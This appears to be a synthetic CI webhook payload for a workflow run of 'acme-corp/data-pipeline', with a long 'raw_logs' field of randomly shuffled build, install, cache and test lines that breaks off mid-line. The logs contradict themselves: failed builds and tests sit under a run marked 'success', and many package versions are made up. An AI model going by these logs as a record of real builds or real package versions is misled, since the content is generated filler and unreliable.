{
  "action": "completed",
  "workflow_run": {
    "id": 188,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-326",
    "head_sha": "eca7a4a8e1b6c68b2e29a158b2743686dea6d8a7",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-21T12:00:21.341590Z",
    "updated_at": "2025-11-21T12:05:30.532537Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\n  PASS: test_db_connect (209ms)\n[12:00:21] INFO: Processing request\nCache hit for key-1329\nInstalling eslint@1.1.0\n  PASS: test_cache_hit (245ms)\n  PASS: test_db_connect (483ms)\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\nInstalling prettier@2.19.0\n\u2713 test completed\n  PASS: test_cache_hit (464ms)\nStep 8/10: Building\n[12:00:21] INFO: Processing request\nFAILED: test_cache_hit\n  PASS: test_api_health (64ms)\nStep 7/10: Building\n\u2713 test completed\n  PASS: test_db_connect (493ms)\n[12:00:21] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nStep 4/10: Building\nCompiling src/service.java...\nCache hit for key-5494\nCache hit for key-6025\nInstalling express@5.17.0\n\u2717 build failed with exit code 4\nInstalling express@1.1.0\n  PASS: test_user_create (273ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (403ms)\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (269ms)\n[12:00:21] INFO: Processing request\nCache hit for key-7990\n\u2717 build failed with exit code 73\n[12:00:21] INFO: Processing request\n\u2713 lint completed\nCompiling src/main.py...\n\u2713 build completed\n\u2713 build completed\n  PASS: test_user_create (180ms)\nCache hit for key-6123\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (35MB)\nInstalling express@3.2.0\nArtifact uploaded: build.tar.gz (3MB)\nInstalling express@1.12.0\n\u2713 lint completed\n\u2713 test completed\nCompiling src/service.java...\nCache hit for key-5190\n  PASS: test_user_create (196ms)\nInstalling lodash@4.13.0\nInstalling prettier@3.4.0\nCompiling src/app.ts...\n\u2713 build completed\nCompiling src/index.js...\nCache hit for key-7708\nCompiling src/index.js...\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nStep 6/10: Building\n[12:00:21] INFO: Processing request\nInstalling react@1.2.0\nCompiling src/app.ts...\nInstalling axios@5.10.0\n  PASS: test_api_health (88ms)\nStep 5/10: Building\n[12:00:21] INFO: Processing request\n\u2713 test completed\nInstalling eslint@2.14.0\nCache hit for key-2330\nCompiling src/handler.rs...\nWARNING: lodash has known vulnerabilities\n[12:00:21] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_db_connect (43ms)\nCache hit for key-9677\n  PASS: test_db_connect (374ms)\n[12:00:21] ERROR: Connection failed\n\u2713 build completed\nStep 5/10: Building\nStep 1/10: Building\nCache hit for key-7041\nStep 8/10: Building\n[12:00:21] INFO: Processing request\n\u2713 build completed\nCache hit for key-1898\n\u2713 lint completed\n  PASS: test_auth_login (71ms)\nArtifact uploaded: build.tar.gz (3MB)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/main.py...\nInstalling webpack@5.10.0\n\u2713 test completed\n  PASS: test_db_connect (62ms)\nCache hit for key-9238\n\u2713 build completed\nCache hit for key-5261\n\u2713 lint completed\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-9888\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 build completed\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 build completed\nCache hit for key-3881\nStep 9/10: Building\nInstalling axios@1.19.0\n  PASS: test_cache_hit (449ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/utils.go...\n\u2713 build completed\nStep 4/10: Building\n  PASS: test_auth_login (410ms)\n\u2713 build completed\nCache hit for key-4139\n=== Step type_check completed ===\n=== Step: setup_node ===\nInstalling axios@1.14.0\nInstalling prettier@2.10.0\nCache hit for key-9295\nStep 4/10: Building\nCompiling src/utils.go...\nCompiling src/app.ts...\n  PASS: test_api_health (233ms)\nCompiling src/app.ts...\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\nStep 7/10: Building\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\n[12:00:21] INFO: Processing request\n\u2713 build completed\nInstalling webpack@5.2.0\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/handler.rs...\nStep 10/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\n[12:00:21] WARN: Deprecated API usage\nException: TypeError\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nStep 10/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\nInstalling react@2.1.0\n  PASS: test_auth_login (128ms)\n[12:00:21] WARN: Deprecated API usage\n\u2713 test completed\n\u2713 build completed\nCache hit for key-4774\nCompiling src/handler.rs...\n  PASS: test_user_create (234ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: NullPointerException\n[12:00:21] INFO: Processing request\nCache hit for key-4875\nStep 7/10: Building\nInstalling react@2.11.0\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (38MB)\nStep 7/10: Building\n[12:00:21] INFO: Processing request\n[12:00:21] WARN: Deprecated API usage\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:21] WARN: Deprecated API usage\n  PASS: test_db_connect (310ms)\nInstalling eslint@5.8.0\n  PASS: test_auth_login (136ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (31MB)\n\u2713 test completed\n[12:00:21] INFO: Processing request\nInstalling axios@4.0.0\nCompiling src/service.java...\nCache hit for key-7107\nInstalling eslint@2.1.0\nArtifact uploaded: build.tar.gz (36MB)\nInstalling jest@5.14.0\nStep 6/10: Building\n[12:00:21] WARN: Deprecated API usage\nStep 6/10: Building\nStep 4/10: Building\nStep 5/10: Building\n[12:00:21] INFO: Processing request\n  PASS: test_db_connect (31ms)\n  PASS: test_user_create (267ms)\nInstalling prettier@1.0.0\n[12:00:21] ERROR: Connection failed\nWARNING: webpack has known vulnerabilities\n  PASS: test_api_health (318ms)\nCache hit for key-9231\nInstalling lodash@1.4.0\nCache hit for key-8587\nInstalling eslint@3.15.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\nCache hit for key-9223\nStep 3/10: Building\n  PASS: test_cache_hit (13ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (24MB)\nStep 5/10: Building\nFAILED: test_api_health\n\u2713 lint completed\n  PASS: test_api_health (36ms)\n  PASS: test_api_health (151ms)\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/10: Building\n  PASS: test_user_create (333ms)\nArtifact uploaded: build.tar.gz (17MB)\nInstalling webpack@1.17.0\nCompiling src/main.py...\nStep 6/10: Building\nCache hit for key-3617\nInstalling express@2.12.0\nCache hit for key-1584\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (48MB)\nInstalling jest@4.5.0\n  PASS: test_db_connect (307ms)\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (409ms)\nStep 8/10: Building\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\nInstalling axios@1.1.0\nStep 9/10: Building\nInstalling webpack@4.9.0\nCache hit for key-7816\nCache hit for key-8449\nStep 10/10: Building\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-5158\nCompiling src/index.js...\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (11MB)\n=== Step setup_node completed ===\n=== Step: setup_environment ===\nStep 8/10: Building\nStep 9/10: Building\nCache hit for key-2032\n  PASS: test_db_connect (383ms)\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-3944\nCache hit for key-4883\nArtifact uploaded: build.tar.gz (22MB)\nStep 8/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (399ms)\n  PASS: test_auth_login (464ms)\nStep 4/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 build completed\n\u2713 build completed\n  PASS: test_auth_login (440ms)\nCache hit for key-6843\nArtifact uploaded: build.tar.gz (50MB)\nInstalling webpack@2.14.0\nStep 3/10: Building\nStep 9/10: Building\nCache hit for key-8711\nInstalling react@1.10.0\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nInstalling lodash@2.13.0\nCompiling src/handler.rs...\nStep 2/10: Building\nCache hit for key-8665\nStep 6/10: Building\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nWARNING: react has known vulnerabilities\n[12:00:21] INFO: Processing request\nInstalling axios@3.8.0\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n  PASS: test_cache_hit (253ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-8754\n\u2713 test completed\nCache hit for key-5995\n\u2713 test completed\n  PASS: test_cache_hit (474ms)\nStep 8/10: Building\nCache hit for key-2274\nCompiling src/service.java...\nInstalling eslint@1.10.0\nStep 2/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@2.15.0\nInstalling webpack@3.11.0\n  PASS: test_user_create (73ms)\nArtifact uploaded: build.tar.gz (37MB)\nInstalling react@1.11.0\nCompiling src/service.java...\nCache hit for key-1220\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 lint completed\nInstalling jest@3.10.0\n\u2713 test completed\nCache hit for key-8874\n\u2713 build completed\nFAILED: test_user_create\nInstalling webpack@5.18.0\nCache hit for key-8432\n[12:00:21] INFO: Processing request\nStep 6/10: Building\nCompiling src/service.java...\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\nStep 3/10: Building\n  PASS: test_db_connect (204ms)\nCompiling src/index.js...\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 test completed\n  PASS: test_cache_hit (488ms)\n  PASS: test_api_health (251ms)\n  PASS: test_auth_login (141ms)\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/index.js...\nInstalling axios@4.16.0\n\u2713 lint completed\nInstalling eslint@5.6.0\nCompiling src/app.ts...\n\u2717 build failed with exit code 2\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 2/10: Building\n[12:00:21] WARN: Deprecated API usage\nStep 7/10: Building\nInstalling express@2.15.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:21] INFO: Processing request\nCache hit for key-4995\nCache hit for key-2175\nStep 1/10: Building\n  PASS: test_cache_hit (406ms)\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:21] INFO: Processing request\nStep 1/10: Building\nInstalling eslint@1.4.0\nCompiling src/main.py...\n\u2713 test completed\nStep 4/10: Building\n\u2713 test completed\nCache hit for key-5658\nStep 3/10: Building\n\u2713 build completed\nCache hit for key-5404\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] WARN: Deprecated API usage\nStep 8/10: Building\n  PASS: test_db_connect (185ms)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nInstalling jest@1.17.0\nCompiling src/handler.rs...\n=== Step setup_environment completed ===\n=== Step: restore_cache ===\n  PASS: test_db_connect (81ms)\n[12:00:21] ERROR: Connection failed\n\u2713 build completed\nStep 8/10: Building\n  PASS: test_cache_hit (167ms)\nStep 8/10: Building\nStep 7/10: Building\n  PASS: test_cache_hit (497ms)\n\u2713 lint completed\nCompiling src/utils.go...\nStep 5/10: Building\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\n[12:00:21] ERROR: Connection failed\nCompiling src/utils.go...\n  PASS: test_user_create (97ms)\n  PASS: test_user_create (42ms)\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nCompiling src/main.py...\n\u2713 lint completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\nCache hit for key-9758\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/service.java...\n[12:00:21] INFO: Processing request\nStep 8/10: Building\nCache hit for key-5617\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\nCompiling src/utils.go...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-8307\n  PASS: test_api_health (372ms)\nStep 1/10: Building\nCompiling src/utils.go...\nInstalling jest@2.15.0\nStep 1/10: Building\nStep 1/10: Building\n[12:00:21] INFO: Processing request\nCache hit for key-5467\n  PASS: test_cache_hit (330ms)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (17MB)\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:21] ERROR: Connection failed\nCache hit for key-5281\n[12:00:21] INFO: Processing request\nCompiling src/index.js...\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_cache_hit (182ms)\nInstalling axios@1.7.0\nCache hit for key-6564\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-7553\nCompiling src/main.py...\n  PASS: test_cache_hit (180ms)\nInstalling jest@1.2.0\nInstalling eslint@4.10.0\nStep 2/10: Building\n\u2713 build completed\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\n[12:00:21] INFO: Processing request\nCache hit for key-7893\nCache hit for key-2622\n[12:00:21] WARN: Deprecated API usage\nException: NullPointerException\nCache hit for key-5116\n\u2713 test completed\n  PASS: test_db_connect (141ms)\nCache hit for key-1072\nStep 7/10: Building\nInstalling webpack@5.19.0\nArtifact uploaded: build.tar.gz (44MB)\nStep 3/10: Building\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 8/10: Building\nCompiling src/index.js...\n  PASS: test_api_health (218ms)\nInstalling lodash@4.18.0\nStep 3/10: Building\nCache hit for key-1559\n\u2713 test completed\nCompiling src/main.py...\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (332ms)\nStep 3/10: Building\nStep 9/10: Building\n  PASS: test_db_connect (332ms)\n\u2713 build completed\n  PASS: test_db_connect (415ms)\nCompiling src/index.js...\nCache hit for key-3987\nCache hit for key-3282\nCache hit for key-6879\n[12:00:21] INFO: Processing request\nStep 8/10: Building\nCompiling src/service.java...\n  PASS: test_cache_hit (305ms)\nInstalling webpack@1.0.0\n  PASS: test_cache_hit (438ms)\nCompiling src/service.java...\nInstalling webpack@2.5.0\n  PASS: test_cache_hit (296ms)\n[12:00:21] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 build completed\n[12:00:21] INFO: Processing request\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] WARN: Deprecated API usage\nCompiling src/utils.go...\n  PASS: test_cache_hit (94ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 test completed\nCache hit for key-8965\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 lint completed\n=== Step restore_cache completed ===\n=== Step: deploy_production ===\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 test completed\n[12:00:21] ERROR: Connection failed\n  PASS: test_auth_login (244ms)\nInstalling lodash@1.12.0\n\u2713 build completed\nStep 7/10: Building\n  PASS: test_api_health (175ms)\n\u2713 lint completed\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-1368\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 test completed\nStep 2/10: Building\n\u2717 build failed with exit code 16\nCache hit for key-7355\nStep 10/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-4202\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (28MB)\nInstalling webpack@1.8.0\n\u2713 test completed\nInstalling webpack@2.12.0\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (190ms)\nException: TypeError\n[12:00:21] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_cache_hit (116ms)\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:21] INFO: Processing request\nCache hit for key-8061\nCache hit for key-2660\nStep 1/10: Building\nInstalling axios@2.7.0\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-8995\n  PASS: test_cache_hit (290ms)\n\u2713 build completed\nStep 6/10: Building\nCache hit for key-7316\nCache hit for key-4811\n[12:00:21] ERROR: Connection failed\n  PASS: test_user_create (377ms)\n[12:00:21] INFO: Processing request\nCache hit for key-2137\nInstalling axios@4.8.0\nCompiling src/handler.rs...\nInstalling react@2.14.0\nCache hit for key-7981\n[12:00:21] INFO: Processing request\nInstalling eslint@3.16.0\n\u2713 test completed\n\u2713 test completed\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 1/10: Building\n[12:00:21] INFO: Processing request\n  PASS: test_auth_login (463ms)\nStep 6/10: Building\n[12:00:21] INFO: Processing request\nCache hit for key-5176\n\u2713 test completed\n[12:00:21] WARN: Deprecated API usage\nInstalling lodash@2.9.0\n\u2713 test completed\nCache hit for key-3858\n  PASS: test_auth_login (479ms)\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (352ms)\nStep 2/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 build completed\n[12:00:21] ERROR: Connection failed\n[12:00:21] WARN: Deprecated API usage\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nStep 7/10: Building\nCompiling src/service.java...\n  PASS: test_user_create (305ms)\nCache hit for key-4927\nCache hit for key-3282\nStep 3/10: Building\nStep 8/10: Building\nCache hit for key-9914\n  PASS: test_api_health (391ms)\n\u2713 lint completed\nInstalling express@4.9.0\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_user_create (17ms)\n  PASS: test_user_create (458ms)\nStep 4/10: Building\nStep 10/10: Building\nStep 8/10: Building\n[12:00:21] INFO: Processing request\n\u2713 lint completed\nInstalling react@5.7.0\n\u2713 lint completed\n[12:00:21] INFO: Processing request\nCache hit for key-2943\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling express@3.4.0\nWARNING: express has known vulnerabilities\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-1866\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nCache hit for key-6803\n\u2713 test completed\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\n[12:00:21] INFO: Processing request\n  PASS: test_db_connect (193ms)\n[12:00:21] INFO: Processing request\n[12:00:21] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (25MB)\nInstalling lodash@5.15.0\nCompiling src/handler.rs...\n\u2713 build completed\nStep 9/10: Building\n\u2713 test completed\nInstalling prettier@3.11.0\n\u2713 build completed\nCompiling src/index.js...\n  PASS: test_api_health (489ms)\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nInstalling jest@4.12.0\n  PASS: test_db_connect (90ms)\nInstalling eslint@1.12.0\n  PASS: test_api_health (97ms)\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 lint completed\nCache hit for key-6805\n  PASS: test_auth_login (453ms)\nCache hit for key-9622\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nInstalling eslint@5.6.0\nCache hit for key-8503\nStep 4/10: Building\n  PASS: test_auth_login (414ms)\n  PASS: test_db_connect (95ms)\n  PASS: test_db_connect (111ms)\nWARNING: prettier has known vulnerabilities\n  PASS: test_user_create (408ms)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nInstalling webpack@1.3.0\nStep 9/10: Building\n  PASS: test_api_health (406ms)\nException: NullPointerException\n  PASS: test_db_connect (282ms)\nInstalling eslint@2.7.0\nCache hit for key-1852\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/main.py...\n  PASS: test_api_health (156ms)\n  PASS: test_api_health (70ms)\nCache hit for key-4717\nInstalling prettier@1.12.0\nCompiling src/index.js...\nCache hit for key-9150\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-2960\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nInstalling eslint@5.11.0\nInstalling webpack@3.11.0\nCache hit for key-5563\n  PASS: test_db_connect (314ms)\nStep 6/10: Building\nCache hit for key-9329\nCache hit for key-5278\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_user_create (321ms)\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-4314\n\u2713 build completed\nStep 10/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (1MB)\nStep 2/10: Building\nWARNING: prettier has known vulnerabilities\nCompiling src/main.py...\nCompiling src/main.py...\nInstalling react@2.3.0\nInstalling express@1.17.0\nCache hit for key-6894\nInstalling lodash@2.10.0\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\nCache hit for key-7149\n  PASS: test_db_connect (206ms)\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:21] INFO: Processing request\nCache hit for key-4258\nFAILED: test_api_health\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n[12:00:21] INFO: Processing request\nStep 10/10: Building\n[12:00:21] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:21] WARN: Deprecated API usage\n  PASS: test_auth_login (103ms)\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\n[12:00:21] INFO: Processing request\n[12:00:21] WARN: Deprecated API usage\nInstalling express@4.11.0\n[12:00:21] INFO: Processing request\nInstalling lodash@2.4.0\n  PASS: test_api_health (61ms)\nCompiling src/handler.rs...\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-2873\nCache hit for key-4788\n\u2713 lint completed\n[12:00:21] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_api_health (16ms)\n\u2713 lint completed\nCache hit for key-7513\n  PASS: test_auth_login (463ms)\nStep 10/10: Building\n\u2713 build completed\nCompiling src/index.js...\nInstalling react@1.15.0\n[12:00:21] INFO: Processing request\n\u2713 build completed\nCache hit for key-7649\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:21] INFO: Processing request\nCompiling src/utils.go...\n[12:00:21] ERROR: Connection failed\n  PASS: test_cache_hit (221ms)\nCache hit for key-8822\nInstalling eslint@3.1.0\nCompiling src/app.ts...\n\u2713 build completed\nStep 3/10: Building\nWARNING: lodash has known vulnerabilities\n[12:00:21] INFO: Processing request\n\u2713 build completed\n  PASS: test_cache_hit (362ms)\nCompiling src/app.ts...\n  PASS: test_user_create (47ms)\nCompiling src/handler.rs...\nStep 6/10: Building\n[12:00:21] INFO: Processing request\nCache hit for key-6381\nInstalling eslint@2.4.0\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_auth_login (162ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:21] WARN: Deprecated API usage\nStep 7/10: Building\nStep 6/10: Building\n[12:00:21] WARN: Deprecated API usage\nInstalling axios@1.5.0\nCache hit for key-9092\nCache hit for key-1649\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\n  PASS: test_api_health (294ms)\n  PASS: test_auth_login (247ms)\n\u2713 test completed\n  PASS: test_cache_hit (165ms)\nCompiling src/app.ts...\nInstalling lodash@5.9.0\nCache hit for key-8287\n\u2717 build failed with exit code 127\nInstalling eslint@3.12.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/app.ts...\n[12:00:21] INFO: Processing request\nCache hit for key-1057\n  PASS: test_cache_hit (202ms)\nWARNING: prettier has known vulnerabilities\nStep 3/10: Building\nCompiling src/app.ts...\nCompiling src/handler.rs...\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (33MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nInstalling webpack@5.3.0\nCompiling src/handler.rs...\n\u2713 test completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_cache_hit (300ms)\n[12:00:21] INFO: Processing request\nInstalling jest@1.13.0\n\u2713 build completed\n[12:00:21] INFO: Processing request\nStep 1/10: Building\nCache hit for key-8968\n\u2713 test completed\nInstalling webpack@3.9.0\n[12:00:21] INFO: Processing request\n\u2713 build completed\n[12:00:21] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (197ms)\nStep 1/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_db_connect (483ms)\nException: TypeError\nStep 2/10: Building\nCompiling src/service.java...\n\u2717 build failed with exit code 11\nStep 3/10: Building\nCache hit for key-5825\n\u2713 test completed\nInstalling express@3.7.0\n\u2713 test completed\n[12:00:21] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (5MB)\nInstalling eslint@3.3.0\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-6557\n  PASS: test_db_connect (87ms)\n[12:00:21] ERROR: Connection failed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_api_health (488ms)\n  PASS: test_api_health (223ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/utils.go...\nCompiling src/main.py...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\nStep 9/10: Building\n\u2713 test completed\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 test completed\nStep 6/10: Building\n\u2713 lint completed\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_auth_login (189ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\nCache hit for key-6746\nCompiling src/service.java...\n  PASS: test_cache_hit (67ms)\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_db_connect (156ms)\nCompiling src/main.py...\nInstalling webpack@3.16.0\n[12:00:21] INFO: Processing request\nCache hit for key-7612\n  PASS: test_cache_hit (106ms)\n=== Step save_cache completed ===\n=== Step: integration_tests ===\n\u2713 build completed\n[12:00:21] ERROR: Connection failed\nInstalling webpack@4.5.0\nStep 2/10: Building\nCache hit for key-7337\n[12:00:21] ERROR: Connection failed\nCache hit for key-9350\n  PASS: test_cache_hit (291ms)\nInstalling jest@4.11.0\n  PASS: test_auth_login (103ms)\nCache hit for key-2082\nCache hit for key-3532\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_user_create (94ms)\n\u2713 build completed\n[12:00:21] INFO: Processing request\n\u2713 test completed\n  PASS: test_db_connect (499ms)\n  PASS: test_db_connect (327ms)\n[12:00:21] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-9661\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 test completed\n  PASS: test_user_create (31ms)\nInstalling prettier@5.18.0\nCache hit for key-7196\nFAILED: test_auth_login\nInstalling prettier@2.10.0\n  PASS: test_cache_hit (271ms)\nCache hit for key-6293\n\u2713 lint completed\n\u2713 build completed\nStep 2/10: Building\nStep 3/10: Building\nArtifact uploaded: 